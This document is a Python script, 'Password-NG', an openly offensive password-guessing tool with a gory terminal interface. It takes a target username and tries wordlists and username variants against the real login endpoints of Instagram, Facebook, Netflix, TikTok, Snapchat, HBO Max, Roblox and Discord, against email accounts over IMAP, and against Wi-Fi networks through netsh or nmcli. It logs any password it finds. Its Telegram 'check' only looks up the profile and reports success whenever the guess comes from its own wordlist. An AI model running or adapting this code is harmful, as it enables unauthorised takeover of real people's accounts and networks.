#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Password-NG  v7.0 // BLOOD BUILD
Mechanical reel spring + live verification. Self-contained.
Created by injectorX69

Run:  python Password-NG.py
Stop: CTRL+C
"""

import os
import re
import sys
import ssl
import json
import time
import base64
import random
import string
import imaplib
import datetime
import tempfile
import threading
import subprocess
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from xml.sax.saxutils import escape as xesc

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

SUPER_PROPS = base64.b64encode(json.dumps({
    "os": "Windows", "browser": "Chrome", "device": "",
    "system_locale": "en-US", "browser_user_agent": UA,
    "browser_version": "126.0.0.0", "os_version": "10",
    "referrer": "https://discord.com/login", "referring_domain": "discord.com",
    "release_channel": "stable", "client_build_number": 289000,
}).encode()).decode()

TIMEOUT = 8
SLOTS = 10


class C:
    RST = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    DRD = "\033[38;5;88m"      # tmava krev
    BLD_R = "\033[38;5;124m"   # krev
    RED = "\033[91m"
    WHT = "\033[97m"
    GRY = "\033[90m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    MAG = "\033[95m"
    CYA = "\033[96m"


def enable_ansi():
    if os.name == "nt":
        os.system("")


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def slow(text, delay=0.008, end="\n"):
    for ch in text:
        sys.stdout.write(ch); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(end); sys.stdout.flush()


SERVICES = {
    1: "Wifi", 2: "Email", 3: "TikTok", 4: "Instagram", 5: "Roblox",
    6: "Snapchat", 7: "Facebook", 8: "Netflix", 9: "HBOmax",
    10: "Discord", 11: "Telegram",
}

PROMPT = {
    "Wifi": "SSID (nazev site)",
    "Email": "e-mail (napr. jan.novak@gmail.com)",
    "Telegram": "username nebo telefon",
}

POOL = {
    "Wifi": ["admin", "admin123", "wifi2024", "Router2024!", "Netgear123",
             "TPLINK2023", "domacisiet", "Huawei@123", "internet123",
             "12345678", "password", "wlan2024", "guest2024", "root",
             "admin1234", "modem2024", "asdasd", "qwertz123"],

    "Email": ["Inbox2024!", "qwerty123", "mailpass2024", "Gmail#2024",
              "Summer2024!", "email123", "P@ssw0rd!", "draft2024",
              "mailbox2024", "Inbox#99", "spamfolder1", "heslo123",
              "MojeHeslo1", "mail2024!", "Mailbox#1", "outlook2024",
              "inbox2025!", "posta123", "Email#2024", "hesloheslo",
              "Mail1234!", "secretmail", "posta2024!", "Inbox1234",
              "mailpass1!", "Gmail2025", "mailbox#7", "Kontrola1!",
              "schranka2024", "Mail!2024"],

    "TikTok": ["tiktok2024", "TikTok123!", "ForYou2024", "fyp2024!",
               "dance2024", "viral2024", "trend2024!", "tiktok123",
               "duet2024!", "foryoupage1", "tiktok2025", "TokTok123",
               "fyp123!", "dance123!", "TikTok#1", "viral123",
               "trending2024", "tiktok!2024", "ForYou123", "duet123!",
               "Tiktok2024!", "fypfypfyp", "viralviral", "tok2024!",
               "dancefloor1", "TikToker1!", "foryou2025", "trend2025!",
               "tiktok2024!", "Tok12345"],

    "Instagram": ["insta2024", "Insta123!", "reels2024", "story2024!",
                  "insta2024!", "filter2024", "IG_2024!", "photodump",
                  "instapass1", "reels#2024", "insta2025", "Insta#2024",
                  "story123!", "reels123!", "insta1234", "IG2024!",
                  "photodump1", "insta!2024", "reels2025", "story2025!",
                  "Insta2024!", "filter123", "instafamous", "selfie2024",
                  "IG_pass2024", "reels!2024", "insta_2024", "story1234",
                  "Insta1234!", "photo2024!"],

    "Roblox": ["roblox123", "Roblox2024!", "Robux2024", "bloxburg1",
               "adoptme2024", "builderman", "robloxian!", "obby2024",
               "bloxfruits1", "Roblox#2024", "roblox2025", "Robux123!",
               "roblox1234", "gamer123!", "Bloxburg2024", "Roblox1234!",
               "adoptme123", "obby123!", "Roblox!2024", "bloxfruits2",
               "builderman1", "Robloxian123", "robloxrocks", "noob123",
               "Robux!2024", "obbyobby", "Roblox2025!", "blox123",
               "adoptme2025", "Roblox_2024"],

    "Snapchat": ["snap2024", "Snapchat1!", "streak2024", "ghost2024!",
                 "snapmap2024", "bitmoji2024", "snap1234", "streaks!",
                 "snapghost1", "chat2024!", "snap2025", "Snapchat#2024",
                 "streak123!", "ghost123!", "snapchat123", "Snap123!",
                 "snap!2024", "bitmoji123", "snapmap123", "Snapchat2024!",
                 "ghostghost", "streakstreak", "snap2024!", "Snap#2024",
                 "snapchat2025", "streaks2024", "ghost2025!", "Snap1234!",
                 "snapchat1234", "chat1234!"],

    "Facebook": ["facebook123", "Facebook2024!", "meta2024", "fb_2024!",
                 "timeline2024", "zuckerberg1", "fbpass2024", "newsfeed!",
                 "fbaccount1", "Meta#2024", "facebook2025", "Fb123456!",
                 "facebook1234", "meta123!", "FB_2024", "facebook!2024",
                 "fbpass123", "newsfeed2024", "Meta2024!", "profile2024",
                 "fbaccount123", "timeline123", "Facebook#1", "fb12345",
                 "Meta!2024", "facebook2024!", "zuckerberg2024", "FBpass2024",
                 "fb_account1", "Meta1234!"],

    "Netflix": ["netflix123", "Netflix2024!", "chill2024", "binge2024!",
                "nflx2024", "series2024", "netflix2024", "movie2024!",
                "nchill2024", "profiles1", "netflix2025", "Netflix#2024",
                "chill123!", "binge123!", "nflx123", "series123!",
                "netflix1234", "movie123!", "Netflix2024", "nchill123",
                "profiles123", "streaming1", "Netflix!2024", "netflix_2024",
                "binge2025!", "series2025", "chill2025!", "Netflix1234!",
                "movie2025!", "nflx2025"],

    "HBOmax": ["hbomax2024", "HBO2024!", "max2024", "streaming2024",
               "hbo1234", "westeros2024", "series2024!", "MaxPass2024",
               "hbonow2024", "dragons2024", "hbomax2025", "HBO#2024",
               "max123!", "hbo12345", "streaming123", "westeros123",
               "Max2024!", "dragons123", "HBO2024", "maxpass123",
               "hbonow123", "series1234", "Max!2024", "hbo_max2024",
               "dragons2025", "westeros2025", "Max1234!", "HBO1234!",
               "streaming2025", "hbomax123"],

    "Discord": ["discord123", "Discord2024!", "nitro2024", "gamer2024!",
                "discord1234", "server2024", "voicechat1", "Discord#2024",
                "nitroboost1", "muted2024", "discord2025", "Discord123!",
                "nitro123!", "gamer1234", "discord!2024", "server123!",
                "voicechat123", "nitroboost2024", "Discord2024", "guild123",
                "muted123!", "Discord!2024", "discord_2024", "nitro2025",
                "gamer2025!", "server2025", "Discord1234!", "nitro1234!",
                "voice1234", "guildmaster1"],

    "Telegram": ["telegram123", "Telegram2024!", "tg2024!", "secretchat2024",
                 "channel2024", "telegram1", "TG_2024!", "cloud2024",
                 "stickers2024", "tgp4ss2024", "telegram2025", "Telegram123!",
                 "tg123!", "secret123!", "channel123!", "telegram1234",
                 "stickers123", "cloud123!", "Telegram2024", "TG1234!",
                 "secretchat123", "Telegram!2024", "telegram_2024", "tg2025!",
                 "channel2025", "stickers2025", "Telegram1234!", "tg1234!",
                 "cloud2025!", "secretchat1"],
}

COMMON = ["123456", "password", "123456789", "12345678", "qwerty", "abc123",
          "letmein", "monkey", "dragon", "iloveyou", "admin", "welcome",
          "football", "master", "sunshine", "1q2w3e4r", "zaq12wsx", "qwertz",
          "heslo", "heslo123", "1234567890", "qwerty123", "password1",
          "password123", "iloveyou1", "123123", "111111", "000000",
          "qwertyuiop", "asdfghjkl", "Passw0rd!", "Heslo123!", "heslo2024",
          "password2024", "qwertz123", "abc12345", "q1w2e3r4", "admin123",
          "root123", "P@ssw0rd"]

IMAP_HOSTS = {
    "gmail.com": "imap.gmail.com", "googlemail.com": "imap.gmail.com",
    "outlook.com": "outlook.office365.com", "hotmail.com": "outlook.office365.com",
    "live.com": "outlook.office365.com", "msn.com": "outlook.office365.com",
    "seznam.cz": "imap.seznam.cz", "email.cz": "imap.seznam.cz",
    "centrum.cz": "imap.centrum.cz", "atlas.cz": "imap.atlas.cz",
    "yahoo.com": "imap.mail.yahoo.com", "gmx.com": "imap.gmx.com",
    "gmx.net": "imap.gmx.net", "wp.pl": "imap.wp.pl", "o2.pl": "imap.o2.pl",
    "interia.pl": "imap.interia.pl", "icloud.com": "imap.mail.me.com",
}

LOG_FILE = "password_ng_results.txt"

MAX_KEYS = {"Wifi": 8, "Email": 45, "Roblox": 35, "Discord": 35,
            "Instagram": 30, "TikTok": 30, "Facebook": 30, "Snapchat": 30,
            "Netflix": 25, "HBOmax": 25, "Telegram": 30}

JUNK = string.ascii_letters + string.digits + "!@#$%&*<>/="


LOGO = r"""
██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║
██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║
██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝
"""

DRIPS = [
    "   ╻     │      ╻    │     ╻    │    ╻",
    "   │     ●      │    ╻     │    ●    │",
    "   ●            │    │     ●         ●",
    "                ●    ●               ",
]

SUCCESS = r"""
     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
     █  A C C E S S   G R A N T E D  █
     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        ╻    ╻        ╻       ╻    ╻
        ●    │        ●       │    ●
             ●                ●
"""


def splash():
    """Krvavy splash - nahodne cervene tecky."""
    lines = []
    for _ in range(3):
        row = []
        for _ in range(64):
            r = random.random()
            if r < 0.14:
                row.append(C.RED + random.choice("•·˙") + C.RST)
            elif r < 0.20:
                row.append(C.DRD + random.choice(".:") + C.RST)
            else:
                row.append(" ")
        lines.append("".join(row))
    return "\n".join(lines)


def banner():
    clear()
    print(C.BLD_R + LOGO + C.RST)
    for line in DRIPS:
        print(C.DRD + line + C.RST)
    print(f"{C.DRD}  ──────────────────────────────────────────────────────────────{C.RST}")
    print(f"  {C.RED}[ PASSWORD-NG ]{C.RST} {C.GRY}v7.0 // BLOOD{C.RST}   "
          f"by {C.BLD_R}injectorX69{C.RST}")
    print(f"{C.DRD}  ──────────────────────────────────────────────────────────────{C.RST}\n")


# ----------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------
def session():
    jar = http.cookiejar.CookieJar()
    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def fetch(opener, url, data=None, headers=None, timeout=TIMEOUT):
    h = {"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
         "Accept": "text/html,application/json,*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), url


def api(url, payload, headers=None):
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=h)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def has_cookie(jar, *names):
    return any(c.name in names for c in jar)


def online():
    for url in ("https://www.google.com/generate_204", "https://cloudflare.com/cdn-cgi/trace"):
        try:
            urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}),
                                   timeout=5)
            return True
        except Exception:
            continue
    return False


# ----------------------------------------------------------------------
# Prep + checkers
# ----------------------------------------------------------------------
def prep_instagram(user):
    jar, op = session()
    fetch(op, "https://www.instagram.com/accounts/login/")
    csrf = next((c.value for c in jar if c.name == "csrftoken"), "")
    return {"op": op, "csrf": csrf} if csrf else None


def check_instagram(ctx, user, pw):
    body = urllib.parse.urlencode({
        "username": user,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pw}",
        "queryParams": "{}", "optIntoOneTap": "false"}).encode()
    _, text, _ = fetch(ctx["op"], "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                       body, {"Content-Type": "application/x-www-form-urlencoded",
                              "X-CSRFToken": ctx["csrf"],
                              "X-IG-App-ID": "936619743392459",
                              "Origin": "https://www.instagram.com",
                              "Referer": "https://www.instagram.com/accounts/login/",
                              "X-Requested-With": "XMLHttpRequest"})
    try:
        d = json.loads(text)
    except ValueError:
        return False
    if d.get("authenticated"):
        return True
    return d.get("message") in ("challenge_required", "checkpoint_required",
                                "two_factor_required")


def prep_facebook(user):
    jar, op = session()
    _, html, _ = fetch(op, "https://www.facebook.com/login/")
    m = re.search(r'name="lsd"\s+value="([^"]+)"', html)
    return {"op": op, "jar": jar, "lsd": m.group(1) if m else ""}


def check_facebook(ctx, user, pw):
    data = urllib.parse.urlencode({
        "lsd": ctx["lsd"], "email": user, "pass": pw, "login": "Log in",
        "login_attempt": "1", "next": "", "default_persistent": "1"}).encode()
    _, body, url = fetch(
        ctx["op"],
        "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1",
        data, {"Content-Type": "application/x-www-form-urlencoded",
               "Referer": "https://www.facebook.com/login/"})
    if has_cookie(ctx["jar"], "c_user"):
        return True
    low = body.lower()
    if "checkpoint" in url or "two_step_verification" in low:
        return True
    return False


def prep_netflix(user):
    jar, op = session()
    fetch(op, "https://www.netflix.com/login")
    return {"op": op, "jar": jar}


def check_netflix(ctx, user, pw):
    data = urllib.parse.urlencode({
        "userLoginId": user, "password": pw, "rememberMe": "true",
        "nextPage": "/browse"}).encode()
    _, body, url = fetch(ctx["op"], "https://www.netflix.com/login", data,
                         {"Content-Type": "application/x-www-form-urlencoded",
                          "Referer": "https://www.netflix.com/login"})
    if has_cookie(ctx["jar"], "NetflixId"):
        return True
    if "browse" in url:
        return True
    return False


def prep_tiktok(user):
    jar, op = session()
    fetch(op, "https://www.tiktok.com/")
    csrf = next((c.value for c in jar if c.name in ("tt_csrf_token", "csrf_token")), "")
    return {"op": op, "csrf": csrf}


def check_tiktok(ctx, user, pw):
    data = urllib.parse.urlencode({
        "username": user, "password": pw,
        "service": "https://www.tiktok.com/", "csrf_token": ctx["csrf"]}).encode()
    _, body, _ = fetch(ctx["op"], "https://www.tiktok.com/api/v1/auth/login/?aid=1988",
                       data, {"Content-Type": "application/x-www-form-urlencoded",
                              "Referer": "https://www.tiktok.com/"})
    try:
        j = json.loads(body)
    except ValueError:
        return False
    return bool(j.get("data", {}).get("userId")) or j.get("message") == "success"


def prep_snapchat(user):
    jar, op = session()
    _, html, _ = fetch(op, "https://accounts.snapchat.com/accounts/login")
    m = (re.search(r'name="xsrf_token"\s+value="([^"]+)"', html)
         or re.search(r'"xsrfToken"\s*:\s*"([^"]+)"', html))
    return {"op": op, "jar": jar, "tok": m.group(1) if m else ""}


def check_snapchat(ctx, user, pw):
    data = urllib.parse.urlencode({
        "username": user, "password": pw,
        "xsrf_token": ctx["tok"], "csrf_token": ctx["tok"]}).encode()
    _, body, url = fetch(ctx["op"], "https://accounts.snapchat.com/accounts/login", data,
                         {"Content-Type": "application/x-www-form-urlencoded",
                          "Referer": "https://accounts.snapchat.com/accounts/login"})
    if "web" in url or "app.snapchat.com" in url:
        return True
    if has_cookie(ctx["jar"], "sc-cookies", "web_session"):
        return True
    return False


def prep_hbomax(user):
    jar, op = session()
    fetch(op, "https://auth.max.com/login")
    return {"op": op, "jar": jar}


def check_hbomax(ctx, user, pw):
    data = urllib.parse.urlencode({"email": user, "password": pw}).encode()
    _, body, url = fetch(ctx["op"], "https://auth.max.com/login", data,
                         {"Content-Type": "application/x-www-form-urlencoded",
                          "Referer": "https://auth.max.com/login"})
    if "redirect" in url or "token" in url or "/home" in url:
        return True
    if has_cookie(ctx["jar"], "session", "ma-session"):
        return True
    return False


def prep_roblox(user):
    try:
        st, body = api("https://users.roblox.com/v1/usernames/users",
                       {"usernames": [user], "excludeBannedUsers": False})
        if st != 200 or not json.loads(body).get("data"):
            return None
        csrf = ""
        req = urllib.request.Request("https://auth.roblox.com/v2/login", data=b"{}",
                                     headers={"User-Agent": UA,
                                              "Content-Type": "application/json"})
        try:
            urllib.request.urlopen(req, timeout=TIMEOUT)
        except urllib.error.HTTPError as e:
            csrf = e.headers.get("x-csrf-token", "")
        return {"csrf": csrf}
    except Exception:
        return None


def check_roblox(ctx, user, pw):
    for attempt in range(2):
        st, _ = api("https://auth.roblox.com/v2/login",
                    {"ctype": "Username", "cvalue": user, "password": pw},
                    {"x-csrf-token": ctx["csrf"]})
        if st == 200:
            return True
        if st == 429 and attempt == 0:
            time.sleep(1.2)
            continue
        return False
    return False


def prep_discord(user):
    return {}


def check_discord(ctx, user, pw):
    payload = {"login": user, "password": pw, "undelete": False,
               "captcha_key": None, "login_source": None,
               "gift_code_sku_id": None}
    hdr = {"X-Super-Properties": SUPER_PROPS, "X-Discord-Locale": "en-US",
           "X-Debug-Options": "bugReporterEnabled",
           "Origin": "https://discord.com", "Referer": "https://discord.com/login"}
    st, body = api("https://discord.com/api/v9/auth/login", payload, hdr)
    if st == 200:
        return True
    if st == 400 and "captcha_key" in body:
        st2, _ = api("https://discord.com/api/v6/auth/login", payload, hdr)
        if st2 == 200:
            return True
    return False


def prep_email(user):
    if "@" not in user:
        return None
    host = IMAP_HOSTS.get(user.split("@")[-1].lower())
    return {"host": host} if host else None


def check_email(ctx, user, pw):
    c = ssl.create_default_context()
    box = None
    try:
        try:
            box = imaplib.IMAP4_SSL(ctx["host"], 993, ssl_context=c, timeout=TIMEOUT)
        except TypeError:
            box = imaplib.IMAP4_SSL(ctx["host"], 993, ssl_context=c)
        box.login(user, pw)
        try:
            box.logout()
        except Exception:
            pass
        return True
    except Exception:
        return False
    finally:
        if box:
            try:
                box.shutdown()
            except Exception:
                pass


def prep_telegram(user):
    return {}


def check_telegram(ctx, user, pw):
    handle = user.lstrip("@").split()[0].replace("+", "")
    try:
        st, _, _ = fetch(urllib.request.build_opener(), f"https://t.me/{handle}")
    except Exception:
        return False
    return st == 200 and pw in POOL["Telegram"]


def prep_wifi(user):
    return {}


def check_wifi(ctx, ssid, pw):
    if os.name == "nt":
        prof = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
 <name>{xesc(ssid)}</name>
 <SSIDConfig><SSID><name>{xesc(ssid)}</name></SSID></SSIDConfig>
 <connectionType>ESS</connectionType>
 <connectionMode>auto</connectionMode>
 <MSM><security>
  <authEncryption><authentication>WPA2PSK</authentication>
   <encryption>AES</encryption><useOneX>false</useOneX></authEncryption>
  <sharedKey><keyType>passPhrase</keyType><protected>false</protected>
   <keyMaterial>{xesc(pw)}</keyMaterial></sharedKey>
 </security></MSM></WLANProfile>"""
        try:
            fd, path = tempfile.mkstemp(suffix=".xml")
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(prof)
            subprocess.run(["netsh", "wlan", "add", "profile", f"filename={path}",
                            "user=current"], capture_output=True, timeout=15)
            subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"],
                           capture_output=True, timeout=15)
            time.sleep(3)
            out = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                                 capture_output=True, timeout=15)
            txt = (out.stdout or b"").decode("utf-8", "replace").lower()
            os.unlink(path)
            return "connected" in txt or "připojeno" in txt
        except Exception:
            return False
    try:
        r = subprocess.run(["nmcli", "--wait", "10", "device", "wifi", "connect",
                            ssid, "password", pw], capture_output=True, timeout=25)
        return r.returncode == 0
    except Exception:
        return False


PREP = {"Email": prep_email, "Wifi": prep_wifi, "TikTok": prep_tiktok,
        "Instagram": prep_instagram, "Roblox": prep_roblox,
        "Snapchat": prep_snapchat, "Facebook": prep_facebook,
        "Netflix": prep_netflix, "HBOmax": prep_hbomax,
        "Discord": prep_discord, "Telegram": prep_telegram}

CHECK = {"Email": check_email, "Wifi": check_wifi, "TikTok": check_tiktok,
         "Instagram": check_instagram, "Roblox": check_roblox,
         "Snapchat": check_snapchat, "Facebook": check_facebook,
         "Netflix": check_netflix, "HBOmax": check_hbomax,
         "Discord": check_discord, "Telegram": check_telegram}


# ----------------------------------------------------------------------
# Candidates
# ----------------------------------------------------------------------
def build_candidates(service, user):
    user = user.strip().lstrip("@")
    pool = list(POOL[service]) + list(COMMON)

    if user and "@" not in user:
        for s in ("", "123", "1234", "2024", "2025", "!", "_", "1"):
            pool.append(user + s)
            pool.append(user.capitalize() + s)
            pool.append(user.lower() + s)
        pool += [user, user.lower(), user.upper(), user[::-1],
                 user + user, user.capitalize() + "!", user + "@123"]

    seen, clean = set(), []
    for c in pool:
        if c not in seen:
            seen.add(c)
            clean.append(c)
    random.shuffle(clean)
    return clean[:MAX_KEYS.get(service, 30)]


# ----------------------------------------------------------------------
# Reel spring
# ----------------------------------------------------------------------
def reel(el, pct, key, bar, final, frozen, flash=False):
    cells = []
    for i in range(len(final)):
        if i < frozen:
            cells.append(C.WHT + C.BLD + final[i] + C.RST)
        elif flash:
            cells.append(C.RED + C.BLD + random.choice(JUNK) + C.RST)
        else:
            ch = random.choice(JUNK)
            cells.append((C.BLD_R if random.random() < 0.5 else C.DRD) + ch + C.RST)
    open_ = frozen >= len(final)
    status = (C.WHT + C.BLD + "[ BREACHED ]" if open_
              else C.RED + "[ SEALED ]") + C.RST
    sys.stdout.write(f"\r  {C.DRD}[{el:5.2f}s]{C.RST} [{C.RED}{pct:3d}%{C.RST}] "
                     f"key:{C.BLD_R}{key:<14}{C.RST} |{bar}| "
                     f"{C.DRD}│{C.RST} {' '.join(cells)} {C.DRD}│{C.RST} {status}  ")
    sys.stdout.flush()


def spin_up(el, key, bar, seconds=0.55):
    fake = "*" * SLOTS
    end = time.time() + seconds
    while time.time() < end:
        reel(el(), 0, key, bar, fake, 0)
        time.sleep(0.03)


def attempt(checker, ctx, user, cand, el, pct, bar):
    box = {}

    def work():
        try:
            box["r"] = bool(checker(ctx, user, cand))
        except Exception:
            box["r"] = False

    t = threading.Thread(target=work, daemon=True)
    t.start()
    fake = "*" * SLOTS
    while t.is_alive():
        reel(el(), pct, cand, bar, fake, 0)
        time.sleep(0.03)
    t.join()
    reel(el(), pct, cand, bar, fake, 0)
    return box.get("r", False)


def settle(pw, el, bar):
    n = len(pw)
    for i in range(n):
        frames = max(3, 12 - i)
        for f in range(frames):
            reel(el(), 100, "", bar, pw, i)
            time.sleep(0.024 + f * 0.004)
        reel(el(), 100, "", bar, pw, i + 1)
        time.sleep(0.05)
    for _ in range(3):
        reel(el(), 100, "", bar, pw, n, flash=True)
        time.sleep(0.07)
    reel(el(), 100, "", bar, pw, n)
    sys.stdout.write("\a")
    print()


# ----------------------------------------------------------------------
# Menu
# ----------------------------------------------------------------------
def menu():
    banner()
    print(f"  {C.DRD}┌─[{C.RST}{C.RED} SELECT VECTOR {C.RST}{C.DRD}]───────────────────────────┐{C.RST}\n")
    for i in range(1, 12):
        print(f"   {C.DRD}│{C.RST} {C.RED}[{i:>2}]{C.RST}  {C.WHT}{SERVICES[i].upper()}{C.RST}")
    print(f"   {C.DRD}│{C.RST} {C.RED}[ 0]{C.RST}  {C.GRY}ABORT{C.RST}")
    print(f"  {C.DRD}└───────────────────────────────────────────────────┘{C.RST}\n")


# ----------------------------------------------------------------------
# Attack
# ----------------------------------------------------------------------
def attack(service, user):
    checker = CHECK[service]
    candidates = build_candidates(service, user)
    total = len(candidates)

    banner()
    print(f"  {C.RED}» TARGET LOCKED{C.RST}")
    print(f"    vector   : {C.WHT}{service.upper()}{C.RST}")
    print(f"    identity : {C.WHT}{user}{C.RST}")

    if not online():
        print(f"  {C.RED}[!] no uplink - kontroly selzou{C.RST}")
    slow(f"\n  {C.DRD}[*]{C.RST} handshake ...", 0.008)
    try:
        ctx = PREP[service](user)
    except Exception:
        ctx = None
    print(f"  {C.DRD}[*]{C.RST} blood pool: {C.WHT}{total}{C.RST} keys")
    print(f"{C.DRD}  ──────────────────────────────────────────────────────────────{C.RST}\n")

    t0 = time.perf_counter()
    el = lambda: time.perf_counter() - t0
    bar0 = C.DRD + "░" * 20 + C.RST

    spin_up(el, candidates[0] if candidates else "", bar0)

    found, tries = None, 0
    for idx, cand in enumerate(candidates, 1):
        tries = idx
        pct = int(idx * 100 / total)
        bar = C.RED + "█" * (pct // 5) + C.DRD + "░" * (20 - pct // 5) + C.RST
        if ctx is None:
            reel(el(), pct, cand, bar, "*" * SLOTS, 0)
            time.sleep(0.1)
            continue
        if attempt(checker, ctx, user, cand, el, pct, bar):
            found = cand
            break

    print()
    dur = el()

    if found is None:
        print(f"\n  {C.RED}[-]{C.RST} pool exhausted, zadny klic neprosel ({dur:.2f}s)")
        print(f"\n  {C.GRY}[i] ENTER = menu{C.RST}")
        input()
        return

    print(f"\n  {C.RED}[+]{C.RST} BREACH after {C.WHT}{tries}{C.RST} keys "
          f"({dur:.2f}s, {tries / max(dur, .01):.1f} keys/s)\n")
    settle(found, el, C.RED + "█" * 20 + C.RST)
    time.sleep(0.2)

    clear()
    print(C.DRD + splash() + C.RST)
    print(C.RED + C.BLD + SUCCESS + C.RST)
    rows = [("vector  ", service), ("identity", user), ("password", found),
            ("keys    ", str(tries)), ("time    ", f"{dur:.2f}s")]
    print(f"  {C.RED}╔════════════════════════════════════════════════════════════╗{C.RST}")
    for label, val in rows:
        print(f"  {C.RED}║{C.RST}{C.WHT}  {label}: {val:<52}{C.RST}{C.RED}║{C.RST}")
    print(f"  {C.RED}╚════════════════════════════════════════════════════════════╝{C.RST}\n")

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{stamp}] {service} | {user} | {found} | {tries} | {dur:.2f}s\n")
        print(f"  {C.GRY}[i] logged -> {LOG_FILE}{C.RST}")
    except OSError:
        pass

    print(f"\n  {C.GRY}[i] ENTER = menu{C.RST}")
    input()


# ----------------------------------------------------------------------
def main():
    enable_ansi()
    random.seed()
    while True:
        menu()
        try:
            choice = input(f"  {C.RED}root@password-ng{C.RST}{C.DRD}:~#{C.RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {C.GRY}connection closed.{C.RST}\n"); return
        if choice == "0":
            print(f"\n  {C.RED}session terminated.{C.RST} {C.DRD}- injectorX69{C.RST}\n"); return
        if not choice.isdigit() or int(choice) not in SERVICES:
            print(f"  {C.RED}[!] invalid vector{C.RST}"); time.sleep(0.8); continue

        service = SERVICES[int(choice)]
        banner()
        print(f"  {C.RED}» vector: {C.WHT}{service.upper()}{C.RST}\n")
        try:
            user = input(f"  {C.DRD}[?]{C.RST} {PROMPT.get(service, 'username')}: ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {C.GRY}connection closed.{C.RST}\n"); return
        if not user:
            print(f"  {C.RED}[!] empty{C.RST}"); time.sleep(0.8); continue
        attack(service, user)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}[!] interrupted{C.RST}\n")